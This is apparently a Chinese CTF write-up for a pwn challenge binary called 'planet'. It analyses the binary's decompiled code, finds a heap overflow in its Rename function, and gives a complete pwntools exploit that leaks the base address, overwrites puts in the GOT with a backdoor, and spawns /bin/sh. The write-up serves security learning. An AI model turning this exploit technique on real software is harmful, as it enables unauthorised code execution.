1. checksec

   ```
   [*] '/home/kali/Desktop/planet'
       Arch:     amd64-64-little
       RELRO:    Partial RELRO
       Stack:    Canary found
       NX:       NX enabled
       PIE:      PIE enabled
   ```
   保护基本全开
2. IDA静态分析

   ```
   __int64 __fastcall main(int a1, char **a2, char **a3)
   {
     unsigned int v4; // eax
     char s1[88]; // [rsp+20h] [rbp-60h] BYREF
     unsigned __int64 v6; // [rsp+78h] [rbp-8h]

     v6 = __readfsqword(0x28u);
     alarm(0x78u);
     printf("Passwd: ");
     fflush(stdout);
     gets(s1);
     if ( !strcmp(s1, "secret_passwd_anti_bad_guys") )
     {
       v4 = time(0LL);
       srand(v4);
       sub_13E7();
       sub_1929();
     }
     return 0LL;
   }
   ```
   输入 `secret_passwd_anti_bad_guys` 后可以进行星球旅行，多种功能
   sub_13E7()：

   ```
   unsigned int sub_13E7()
   {
     puts("Welcome in a new dimension...");
     fflush(stdout);
     puts("\t...Boooom... the big bang sound...");
     fflush(stdout);
     sub_12F2();
     sleep(1u);
     puts("\t\ta new universe has begun, with new physics laws...");
     fflush(stdout);
     puts("\t...here stacks look safe!");
     fflush(stdout);
     return sleep(1u);
   }
   ```
   sub_12F2():

   ```
   char *sub_12F2()
   {
     char *result; // rax
     int i; // [rsp+4h] [rbp-1Ch]
     char *v2; // [rsp+8h] [rbp-18h]
     char *dest; // [rsp+10h] [rbp-10h]
     char *src; // [rsp+18h] [rbp-8h]
     char *srca; // [rsp+18h] [rbp-8h]

     dest = (char *)malloc(0x28uLL);
     ::dest = dest;
     *((_QWORD *)dest + 4) = 0LL;
     src = (char *)sub_1245(5LL);
     strcpy(dest, src);
     *((_QWORD *)dest + 2) = &dword_40D0;
     free(src);
     for ( i = 0; i <= 9; ++i )
     {
       v2 = (char *)malloc(0x28uLL);
       srca = (char *)sub_1245(5LL);
       strcpy(v2, srca);
       free(srca);
       *((_QWORD *)v2 + 2) = &dword_40D0;
       *((_QWORD *)dest + 3) = v2;
       *((_QWORD *)v2 + 4) = dest;
       dest = v2;
     }
     result = v2;
     *((_QWORD *)v2 + 3) = 0LL;
     return result;
   }
   ```
   在全局变量dest中分配了0x28字节大小的内存，将最后8字节设为0

   scr=sub_1245(5)：

   ```
   _BYTE *__fastcall sub_1245(int a1)
   {
     int i; // [rsp+10h] [rbp-10h]
     _BYTE *v3; // [rsp+18h] [rbp-8h]

     v3 = 0LL;
     if ( a1 )
     {
       v3 = malloc(a1 + 1);
       if ( v3 )
       {
         for ( i = 0; i < a1; ++i )
           v3[i] = aAbcdefghijklmn[rand() % 26];
         v3[a1] = 0;
       }
     }
     return v3;
   }
   ```
   分配6byte空间大小，再令此空间随机为a-n的任意字符，返回这个字符串所在地址，给src，再令全局变量dest指向的0x28空间前六字节为这个字符串，再令全局变量dest指向的0x18偏移处的值为0x40D0（全局变量0x40D0值为1）

   接着进行10次循环，每次操作为：创建0x28大小的空间，偏移为0处长度为六的随机字符串，0x10处为全局变量0x40D0的地址，0x18处记录下一个结构体起始地址，0x20处指向上一个创建的结构体的地址

   由此创建了一个长度为11的结构体链表，result为尾节点，再令储存下一节点的字段为0，返回头指针

   sub_1929()为可执行的操作：

   ```
   void sub_1929()
   {
     int i; // [rsp+8h] [rbp-68h]
     char s1[88]; // [rsp+10h] [rbp-60h] BYREF
     unsigned __int64 v2; // [rsp+68h] [rbp-8h]

     v2 = __readfsqword(0x28u);
     while ( 1 )
     {
       printf("What is your next move? (Help)\n>");
       fflush(stdout);
       gets(s1);
       for ( i = 0; i <= 9; ++i )
       {
         if ( !strcmp(s1, off_4100[i]) )
         {
           funcs_19CE[i]();
           i = 10;
         }
       }
     }
   }
   ```
   根据你输入的内容进行功能调用，funcs_19CE是一个指针数组，储存着10个函数指针，基本功能有：

   * Help：输出帮助信息
   * exit
   * jump

     ```
     __int64 sub_14AC()
     {
       puts("I'm going to the next planet...");
       fflush(stdout);
       if ( (dword_40D0 & 1) != 0 )
       {
         ++dword_40D0;
         if ( *((_QWORD *)dest + 3) )
         {
           dest = (char *)*((_QWORD *)dest + 3);
         }
         else
         {
           puts("I can't... the next planet is a black hole");
           fflush(stdout);
         }
         return 0LL;
       }
       else
       {
         puts("Sorry, I'm too tired, I need a nap!");
         fflush(stdout);
         return 0LL;
       }
     }
     ```
     若dword_40D0为奇数则++dword_40D0，dest起始指向头结构体，若此结构标志位为1，则全局变量dest指向下一节点
   * GetName:打印dest值
   * Rename

     ```
     __int64 sub_1589()
     {
       size_t v0; // rax
       char s[40]; // [rsp+0h] [rbp-30h] BYREF
       unsigned __int64 v3; // [rsp+28h] [rbp-8h]

       v3 = __readfsqword(0x28u);
       puts("Enter the new name");
       fflush(stdout);
       gets(s);
       v0 = strlen(s);
       strncpy(dest, s, v0);
       return 0LL;
     }
     ```
     将输入的新名字复制给dest，而输入字符串的长度限制为0x28，可以覆盖掉下一个chunk的mchunk_prev_size字段，造成堆溢出
   * Check

     ```
     __int64 sub_1686()
     {
       puts("I'm going to the previous planet...");
       fflush(stdout);
       ++dword_40D0;
       if ( *((_QWORD *)dest + 4) )
       {
         dest = (char *)*((_QWORD *)dest + 4);
       }
       else
       {
         puts("I can't... the previous planet is a star");
         fflush(stdout);
       }
       return 0LL;
     }
     ```
     若dest不为头节点，就回到上一节点
   * Goback:

     ```
     _int64 sub_160F()
     {
       char v1[40]; // [rsp+0h] [rbp-30h] BYREF
       unsigned __int64 v2; // [rsp+28h] [rbp-8h]

       v2 = __readfsqword(0x28u);
       puts("...mmm this universe is weird, addresses on the stack cannot being overwritten... u can check it");
       fflush(stdout);
       sleep(1u);
       gets(v1);
       fflush(stdout);
       return 0LL;
     }
     ```
   * Search:什么也没干

     ```
     __int64 Search()
     {
       puts("I'm looking for the Zer0...");
       fflush(stdout);
       sleep(1u);
       puts("...mmm he's not here... he's hidden very well");
       fflush(stdout);
       return 0LL;
     }
     ```
   * Nap

     ```
     __int64 sub_174A()
     {
       if ( (dword_40D0 & 1) != 0 )
       {
         puts("Ehi, I'm not tired!!");
         fflush(stdout);
       }
       else
       {
         puts("It's time to have a rest... see you later!!");
         fflush(stdout);
         sleep(2u);
         puts("I have got a wonderful nap!!");
         fflush(stdout);
         ++dword_40D0;
       }
       return 0LL;
     }
     ```
     若为奇数则什么也不做，若为偶数则++
   * Admin

     ```
     __int64 sub_17D3()
     {
       const char *v0; // rsi
       char s1[88]; // [rsp+0h] [rbp-60h] BYREF
       unsigned __int64 v3; // [rsp+58h] [rbp-8h]

       v3 = __readfsqword(0x28u);
       printf("Insert the secret passwd\n> ");
       fflush(stdout);
       gets(s1);
       v0 = sub_1245(30);
       if ( !strcmp(s1, v0) )
       {
         off_41B0();
       }
       else
       {
         puts("Password is wrong");
         fflush(stdout);
       }
       return 0LL;
     }
     ```
     若输入的字符串和随机生成的一样则执行off_41B0();

     off_41B0即backdoor

     ```
     __int64 sub_1886()
     {
       char s[10]; // [rsp+Eh] [rbp-12h] BYREF
       unsigned __int64 v2; // [rsp+18h] [rbp-8h]

       v2 = __readfsqword(0x28u);
       printf("The command to exec\n> ");
       fflush(stdout);
       gets(s);
       if ( strlen(s) <= 8 )
       {
         system(s);
         fflush(stdout);
         return 0LL;
       }
       else
       {
         puts("length error");
         return 1LL;
       }
     }
     ```
3. exp:把puts的got表改为后门函数地址，触发puts函数就获取shell

   ```
   from pwn import *

   context(log_level='debug',arch='amd64',os='linux')

   io = process('/home/kali/Desktop/planet')


   def Help():
       io.sendafter(b'What is your next move? (Help)\n>',b'Help\n')


   def Jump():
       io.sendafter(b'What is your next move? (Help)\n>',b'Jump\n')


   def GetName():
       io.sendafter(b'What is your next move? (Help)\n>',b'GetName\n')


   def Rename(name):
       io.sendafter(b'What is your next move? (Help)\n>',b'Rename\n')
       io.sendafter(b'Enter the new name\n', name)


   def Check():
       io.sendafter(b'What is your next move? (Help)\n>',b'Check\n')


   def GoBack(exp):
       io.sendafter(b'What is your next move? (Help)\n>',b'GoBack\n')
       io.sendafter(b'...mmm this universe is weird, addresses on the stack cannot being overwritten... u can check it\n', exp.encode(encoding='utf-8')+ b'\n')


   def Search():
       io.sendafter(b'What is your next move? (Help)\n>',b'Search\n')


   def Nap():
       io.sendafter(b'What is your next move? (Help)\n>',b'Nap\n')


   def Admin():
           io.sendafter(b'What is your next move? (Help)\n>', b'Admin\n')


   io.sendafter(b'Passwd: ',b'secret_passwd_anti_bad_guys\n')


   Rename(b'a'* 0x10+b'\n')
   GetName()
   base = u64(io.recvuntil(b'\x0a')[42:48].ljust(8,b'\x00')) - 0x40D0
   print(hex(base))

   backdoor = base + 0x1886
   print(hex(backdoor))
   puts_got = 0x55b3f09e5030-0x55b3f09e1000+base

   Jump()
   Nap()
   Rename(b'a'*0x18 + p64(puts_got)+b'\n')
   Jump()
   GetName()
   print(p64(backdoor))

   Rename(p64(backdoor)+b'\n')
   io.sendafter(b'What is your next move? (Help)\n',b'Help\n')
   io.sendafter(b'The command to exec\n',b'/bin/sh\n')


   io.interactive()
   ```
